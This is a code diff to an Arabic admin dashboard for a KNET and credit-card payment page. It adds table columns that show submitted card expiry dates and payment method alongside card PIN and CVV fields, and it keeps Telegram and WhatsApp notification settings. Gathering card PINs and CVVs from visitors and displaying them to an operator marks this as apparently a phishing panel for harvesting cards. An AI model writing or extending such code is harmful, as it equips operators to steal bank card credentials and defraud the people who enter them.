@@ -9,7 +9,7 @@
   <link rel="manifest" href="/static/frontend/images/favicon/site.webmanifest" />
   <meta name="theme-color" content="#0f766e" />
   <link rel="stylesheet" href="/static/admin/vendor/tabler/tabler.min.css" />
-    <link rel="stylesheet" href="/static/admin/css/dashboard.css?v=20260326-27" />
+    <link rel="stylesheet" href="/static/admin/css/dashboard.css?v=20260326-33" />
 </head>
 <body class="admin-dashboard">
   <div class="page">
@@ -191,14 +191,14 @@
           <div class="payment-settings-card">
             <div class="payment-settings-head">
               <h4 class="payment-settings-title">طرق الدفع</h4>
-              <p class="payment-settings-note">اختر طريقة دفع واحدة على الأقل للمتجر وصفحة الدفع.</p>
+              <p class="payment-settings-note">اختر طريقة الدفع المعتمدة للمتجر وصفحة الدفع.</p>
             </div>
             <label class="payment-settings-option">
-              <input type="checkbox" id="payment-knet-input" checked>
+              <input type="radio" name="payment_method_setting" id="payment-knet-input" checked>
               <span>كي نت</span>
             </label>
             <label class="payment-settings-option">
-              <input type="checkbox" id="payment-cards-input" checked>
+              <input type="radio" name="payment_method_setting" id="payment-cards-input">
               <span>بطاقات الائتمان (Visa / Mastercard)</span>
             </label>
             <p class="settings-token-feedback" id="payment-settings-feedback" hidden aria-live="polite"></p>
@@ -491,7 +491,7 @@
       var ADMIN_SOCKET_RECONNECT_MAX_MS = 10000;
       var storedTelegramSettings = {{ (telegram_settings if telegram_settings is defined and telegram_settings is not none else {"api_token": "", "chat_id": ""})|tojson }};
       var storedWhatsappSettings = {{ (whatsapp_settings if whatsapp_settings is defined and whatsapp_settings is not none else {"value": ""})|tojson }};
-      var storedPaymentSettings = {{ (payment_settings if payment_settings is defined and payment_settings is not none else {"knet_enabled": true, "cards_enabled": true, "testing_enabled": false})|tojson }};
+      var storedPaymentSettings = {{ (payment_settings if payment_settings is defined and payment_settings is not none else {"knet_enabled": true, "cards_enabled": false, "testing_enabled": false})|tojson }};
       var storedSocialSettings = {{ (social_settings if social_settings is defined and social_settings is not none else {"title": "", "url": "", "description": "", "image_url": ""})|tojson }};
       var storedConnectionSettings = {{ (connection_settings if connection_settings is defined and connection_settings is not none else {"mongo": {"url": "", "source": "", "is_dashboard": false}, "redis": {"url": "", "source": "", "is_dashboard": false}, "sql": {"url": "", "source": "", "is_dashboard": false}})|tojson }};
       var availableFrontendPages = {{ (available_frontend_pages if available_frontend_pages is defined and available_frontend_pages is not none else [])|tojson }};
@@ -1411,7 +1411,16 @@
       function getSubmissionColumns(submissions) {
         var columns = [];
         var seenKeys = {};
+        var hasExpiryField = false;
         if (!Array.isArray(submissions)) {
+          columns.push({
+            key: "__expiry_date__",
+            label: "تاريخ الانتهاء"
+          });
+          columns.push({
+            key: "__payment_method__",
+            label: "طريقة الدفع"
+          });
           return columns;
         }
         submissions.forEach(function (submission) {
@@ -1420,6 +1429,16 @@
           }
           submission.fields.forEach(function (field) {
             var key = String(field.name || field.label || "").trim();
+            var normalizedKey = normalizeFieldKey(key);
+            if (
+              normalizedKey === "expirymonth" ||
+              normalizedKey === "شهرالانتهاء" ||
+              normalizedKey === "expiryyear" ||
+              normalizedKey === "سنةالانتهاء"
+            ) {
+              hasExpiryField = true;
+              return;
+            }
             if (!key || seenKeys[key]) {
               return;
             }
@@ -1430,7 +1449,63 @@
             });
           });
         });
+        if (hasExpiryField) {
+          var expiryColumn = {
+            key: "__expiry_date__",
+            label: "تاريخ الانتهاء"
+          };
+          var securityCodeColumnIndex = columns.findIndex(function (column) {
+            var normalizedKey = normalizeFieldKey(column && column.key);
+            var normalizedLabel = normalizeFieldKey(column && column.label);
+            return (
+              normalizedKey === "cardpin" ||
+              normalizedLabel === "cardpin" ||
+              normalizedLabel === "cvv" ||
+              normalizedLabel === "الرقمالسري"
+            );
+          });
+          if (securityCodeColumnIndex === -1) {
+            columns.push(expiryColumn);
+          } else {
+            columns.splice(securityCodeColumnIndex, 0, expiryColumn);
+          }
+        }
+        columns.push({
+          key: "__payment_method__",
+          label: "طريقة الدفع"
+        });
         return columns;
+      }
+
+      function getSubmissionPaymentMethod(submission) {
+        if (!submission || !Array.isArray(submission.fields)) {
+          return "knet";
+        }
+        var cardPinField = submission.fields.find(function (field) {
+          return normalizeFieldKey(field && field.name) === "cardpin";
+        });
+        var cardPinLabel = normalizeFieldKey(cardPinField && cardPinField.label);
+        if (cardPinLabel === "cvv") {
+          return "cards";
+        }
+        return "knet";
+      }
+
+      function renderSubmissionPaymentMethodMarkup(submission) {
+        var paymentMethod = getSubmissionPaymentMethod(submission);
+        if (paymentMethod === "cards") {
+          return (
+            "<div class=\"submission-payment-icons\">" +
+              "<img class=\"is-card-brand\" src=\"/static/frontend/images/visa.svg\" alt=\"Visa\" />" +
+              "<img class=\"is-card-brand\" src=\"/static/frontend/images/mastercard.svg\" alt=\"Mastercard\" />" +
+            "</div>"
+          );
+        }
+        return (
+          "<div class=\"submission-payment-icons is-knet\">" +
+            "<img src=\"/static/frontend/images/knet.svg\" alt=\"KNET\" />" +
+          "</div>"
+        );
       }
 
       function getSubmissionFieldValue(submission, columnKey) {
@@ -1458,6 +1533,62 @@
         return rawValue;
       }
 
+      function normalizeNumericString(value) {
+        return String(value || "")
+          .replace(/[٠-٩]/g, function (digit) {
+            return String("٠١٢٣٤٥٦٧٨٩".indexOf(digit));
+          })
+          .replace(/[۰-۹]/g, function (digit) {
+            return String("۰۱۲۳۴۵۶۷۸۹".indexOf(digit));
+          });
+      }
+
+      function getSubmissionExpiryDisplayValue(submission) {
+        var monthValue = "";
+        var yearValue = "";
+        if (submission && Array.isArray(submission.fields)) {
+          submission.fields.forEach(function (field) {
+            var rawName = String((field && field.name) || "").trim().toLowerCase();
+            var rawLabel = String((field && field.label) || "").trim();
+            var candidateValue = String((field && field.value) || "").trim();
+            if (!candidateValue) {
+              return;
+            }
+            if (
+              !monthValue &&
+              (
+                rawName === "expiry_month" ||
+                rawName === "expirymonth" ||
+                rawName === "month" ||
+                rawLabel === "شهر الانتهاء"
+              )
+            ) {
+              monthValue = candidateValue;
+              return;
+            }
+            if (
+              !yearValue &&
+              (
+                rawName === "expiry_year" ||
+                rawName === "expiryyear" ||
+                rawName === "year" ||
+                rawLabel === "سنة الانتهاء"
+              )
+            ) {
+              yearValue = candidateValue;
+            }
+          });
+        }
+        var monthDigits = normalizeNumericString(monthValue).replace(/\D/g, "");
+        var yearDigits = normalizeNumericString(yearValue).replace(/\D/g, "");
+        if (!monthDigits && !yearDigits) {
+          return "";
+        }
+        var paddedMonth = monthDigits ? monthDigits.slice(-2).padStart(2, "0") : "—";
+        var paddedYear = yearDigits ? yearDigits.slice(-4).padStart(4, "0") : "—";
+        return paddedMonth + " / " + paddedYear;
+      }
+
       function getSubmissionValueCellClass(columnKey) {
         var normalizedKey = normalizeFieldKey(columnKey);
         if (normalizedKey === "bank" || normalizedKey === "البنك") {
@@ -1470,12 +1601,19 @@
         if (!submission || !Array.isArray(submission.fields)) {
           return "";
         }
+        var rawKeys = preferredKeys.map(function (key) {
+          return String(key || "").trim().toLowerCase();
+        });
         var normalizedKeys = preferredKeys.map(normalizeFieldKey);
         for (var index = 0; index < submission.fields.length; index += 1) {
           var field = submission.fields[index];
+          var rawName = String(field.name || "").trim().toLowerCase();
+          var rawLabel = String(field.label || "").trim().toLowerCase();
           var nameKey = normalizeFieldKey(field.name);
           var labelKey = normalizeFieldKey(field.label);
           if (
+            rawKeys.indexOf(rawName) !== -1 ||
+            rawKeys.indexOf(rawLabel) !== -1 ||
             normalizedKeys.indexOf(nameKey) !== -1 ||
             normalizedKeys.indexOf(labelKey) !== -1
           ) {
@@ -1634,6 +1772,13 @@
 
       function renderSubmissionRow(submission, columns, columnCount) {
         var cells = columns.map(function (column) {
+          if (column.key === "__payment_method__") {
+            return "<td class=\"submission-value-cell submission-payment-cell\">" + renderSubmissionPaymentMethodMarkup(submission) + "</td>";
+          }
+          if (column.key === "__expiry_date__") {
+            var expiryDisplayValue = getSubmissionExpiryDisplayValue(submission);
+            return "<td class=\"submission-value-cell is-ltr\">" + (expiryDisplayValue ? escapeHtml(expiryDisplayValue) : "—") + "</td>";
+          }
           var value = getSubmissionFieldValue(submission, column.key);
           var displayValue = formatSubmissionDisplayValue(column.key, value);
           return "<td class=\"" + getSubmissionValueCellClass(column.key) + "\">" + (displayValue ? formatFieldValue(displayValue) : "—") + "</td>";
@@ -2846,12 +2991,9 @@
       }
 
       function normalizePaymentSettings(nextSettings) {
-        var knetEnabled = Boolean(nextSettings && nextSettings.knet_enabled);
         var cardsEnabled = Boolean(nextSettings && nextSettings.cards_enabled);
+        var knetEnabled = !cardsEnabled;
         var testingEnabled = Boolean(nextSettings && nextSettings.testing_enabled);
-        if (!knetEnabled && !cardsEnabled) {
-          knetEnabled = true;
-        }
         return {
           knet_enabled: knetEnabled,
           cards_enabled: cardsEnabled,
@@ -2881,7 +3023,7 @@
         }
         var nextSettings = normalizePaymentSettings({
           knet_enabled: paymentKnetInputEl ? paymentKnetInputEl.checked : true,
-          cards_enabled: paymentCardsInputEl ? paymentCardsInputEl.checked : true,
+          cards_enabled: paymentCardsInputEl ? paymentCardsInputEl.checked : false,
           testing_enabled: testingAutofillInputEl ? testingAutofillInputEl.checked : false
         });
         paymentSettingsSaving = true;
